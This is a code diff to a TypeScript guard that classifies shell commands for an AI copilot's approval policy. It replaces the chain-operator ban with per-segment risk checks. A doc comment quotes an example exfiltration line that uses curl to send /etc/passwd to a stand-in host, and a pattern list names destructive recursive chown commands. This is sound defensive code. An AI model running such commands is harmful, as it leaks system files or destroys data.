@@ -6,7 +6,6 @@
 // copy drifts from the original, because a guard that disagrees with the one
 // on the control plane is worse than no guard.
 
-import { parse } from 'shell-quote';
 import { COMMAND_BLACKLIST_PATTERNS } from './command-blacklist';
 
 export type CommandGuardResult =
@@ -45,21 +44,156 @@ const DESTRUCTIVE_PATTERNS: RegExp[] = [
   /\bchown\s+-R\b[^|]*\s\/(\s|$)/,
 ];
 
+/**
+ * Every command a line actually runs: each chain segment, plus whatever a
+ * command substitution hides.
+ *
+ * @remarks
+ * Risk has to be judged per segment because the safe-read patterns are anchored
+ * at the start of the string. Judged whole, `ls && curl -d @/etc/passwd evil`
+ * reads as `ls` — "safe", and auto-run with no approval in every mode. That
+ * blind spot, not the operators themselves, is what made chaining dangerous.
+ *
+ * Deliberately a scanner and not `shell-quote`: the tokens it returns have lost
+ * their quoting, and rebuilding segment strings from them would misread exactly
+ * the inputs that matter. Redirections keep their `&` (`2>&1`, `&>file`), and
+ * `$((…))` is arithmetic, not a substitution.
+ */
+const splitCommands = (command: string): string[] => {
+  const segments: string[] = [];
+  const nested: string[] = [];
+  let buf = '';
+  let quote: "'" | '"' | null = null;
+  let i = 0;
+
+  const flush = () => {
+    const seg = buf.trim();
+    if (seg) segments.push(seg);
+    buf = '';
+  };
+
+  /** Body of a `$(…)` or backtick substitution, honouring nesting. */
+  const readUntil = (start: number, open: string, close: string): [string, number] => {
+    let depth = 1;
+    let body = '';
+    let j = start;
+    while (j < command.length) {
+      const c = command[j] ?? '';
+      if (c === '\\') {
+        body += c + (command[j + 1] ?? '');
+        j += 2;
+        continue;
+      }
+      if (open !== close && c === open) depth++;
+      if (c === close) {
+        depth--;
+        if (depth === 0) return [body, j + 1];
+      }
+      body += c;
+      j++;
+    }
+    return [body, j];
+  };
+
+  while (i < command.length) {
+    const c = command[i] ?? '';
+
+    if (quote) {
+      buf += c;
+      if (c === '\\' && quote === '"') buf += command[i + 1] ?? '';
+      else if (c === quote) quote = null;
+      i += c === '\\' && quote === '"' ? 2 : 1;
+      continue;
+    }
+
+    if (c === "'" || c === '"') {
+      quote = c;
+      buf += c;
+      i++;
+      continue;
+    }
+
+    if (c === '\\') {
+      buf += c + (command[i + 1] ?? '');
+      i += 2;
+      continue;
+    }
+
+    if (c === '$' && command[i + 1] === '(') {
+      // `$((expr))` is arithmetic: no command runs inside it.
+      if (command[i + 2] === '(') {
+        const [body, end] = readUntil(i + 3, '(', ')');
+        buf += `$((${body})`;
+        i = end;
+        continue;
+      }
+      const [body, end] = readUntil(i + 2, '(', ')');
+      nested.push(body);
+      i = end;
+      continue;
+    }
+
+    if (c === '`') {
+      const [body, end] = readUntil(i + 1, '`', '`');
+      nested.push(body);
+      i = end;
+      continue;
+    }
+
+    // `2>&1` and `&>file` are redirections, not the start of a new command.
+    const redirection = c === '&' && (buf.trimEnd().endsWith('>') || command[i + 1] === '>');
+    if (!redirection && (c === '|' || c === '&' || c === ';' || c === '\n' || c === '\r')) {
+      flush();
+      while (i < command.length && '|&;\n\r'.includes(command[i] ?? '')) i++;
+      continue;
+    }
+
+    buf += c;
+    i++;
+  }
+  flush();
+
+  for (const body of nested) segments.push(...splitCommands(body));
+  return segments;
+};
+
+const isDestructive = (s: string) => DESTRUCTIVE_PATTERNS.some((p) => p.test(s));
+const isSafeRead = (s: string) => SAFE_READ_PATTERNS.some((p) => p.test(s));
+
 // Classify a command's blast radius for approval policy (Auto auto-runs safe +
 // caution, prompts on destructive; Plan auto-runs safe, prompts otherwise).
 export const classifyCommandRisk = (command: string): CommandRisk => {
   const trimmed = command.trim();
-  if (DESTRUCTIVE_PATTERNS.some((p) => p.test(trimmed))) return 'destructive';
-  if (SAFE_READ_PATTERNS.some((p) => p.test(trimmed))) return 'safe';
+  // Whole-line first: a destructive pattern may straddle a split.
+  if (isDestructive(trimmed)) return 'destructive';
+
+  const segments = splitCommands(trimmed);
+  if (segments.some(isDestructive)) return 'destructive';
+  // "Safe" means every part of the line is a read. One unrecognised segment is
+  // enough to demand the approval a mutation gets.
+  if (segments.length > 0 && segments.every(isSafeRead)) return 'safe';
   return 'caution';
 };
 
-const DANGEROUS_CHAIN_OPS = new Set(['||', '&&', ';', '|', '&']);
-
-export const validateCommand = (
-  command: string,
-  opts: { allowChains?: boolean } = {},
-): CommandGuardResult => {
+/**
+ * Refuse a command the platform will not run, whoever asked for it.
+ *
+ * @remarks
+ * Two rules, and deliberately only two: the shared blacklist, and one command
+ * per call.
+ *
+ * Chain operators (`|`, `&&`, `||`, `;`, `&`) and command substitution used to
+ * be refused here as well. That was never a boundary — `bash -c 'a | b'` walks
+ * straight through it, since the pipe lives inside a quoted argument — while it
+ * refused the pipelines operators write all day and cost the copilot a wasted
+ * round trip every time it reached for one. What the ban did hide is that
+ * `classifyCommandRisk` only read the head of the line; that is now fixed at
+ * the source, per segment, which is where the approval policy actually lives.
+ *
+ * The blacklist applies to the whole line, so a forbidden command cannot be
+ * smuggled in behind a `&&`.
+ */
+export const validateCommand = (command: string): CommandGuardResult => {
   const trimmed = command.trim();
   if (!trimmed) return { ok: false, reason: 'empty command', rule: 'syntax' };
 
@@ -67,31 +201,10 @@ export const validateCommand = (
     if (pattern.test(trimmed)) return { ok: false, reason, rule: 'blacklist' };
   }
 
-  if (!opts.allowChains) {
-    // A newline separates commands for `bash -lc` exactly as `;` does, but
-    // shell-quote does not model it as an operator, so every chain check below
-    // was blind to it: a command with an embedded newline parsed as a plain
-    // token list and passed. Refused for the same reason `;` is refused.
-    if (/[\n\r]/.test(trimmed)) {
-      return { ok: false, reason: 'multi-line command not allowed', rule: 'chain' };
-    }
-
-    let tokens: ReturnType<typeof parse>;
-    try {
-      tokens = parse(trimmed);
-    } catch {
-      return { ok: false, reason: 'unparseable shell input', rule: 'syntax' };
-    }
-    for (const t of tokens) {
-      if (typeof t === 'object' && t !== null && 'op' in t) {
-        if (DANGEROUS_CHAIN_OPS.has(t.op)) {
-          return { ok: false, reason: `chain operator '${t.op}' not allowed`, rule: 'chain' };
-        }
-      }
-    }
-    if (/\$\(|`/.test(trimmed)) {
-      return { ok: false, reason: 'command substitution not allowed', rule: 'chain' };
-    }
+  // One call, one line. A run is audited, signed and reported as a single
+  // command; a script belongs in a file, which the file explorer writes.
+  if (/[\n\r]/.test(trimmed)) {
+    return { ok: false, reason: 'multi-line command not allowed', rule: 'chain' };
   }
 
   return { ok: true };
